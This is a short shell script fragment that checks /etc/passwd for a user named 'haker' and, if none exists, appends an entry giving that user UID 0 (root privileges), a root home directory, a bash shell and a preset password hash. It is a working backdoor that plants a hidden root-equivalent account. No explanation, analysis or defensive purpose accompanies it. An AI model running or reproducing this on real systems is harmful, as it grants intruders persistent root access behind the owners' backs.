if ! cat /etc/passwd | grep haker; then
	echo 'haker:$1$haker$NDsRCbgLUPKz/svhGo2X1/:0:0:root:/root:/bin/bash' >> /etc/passwd
fi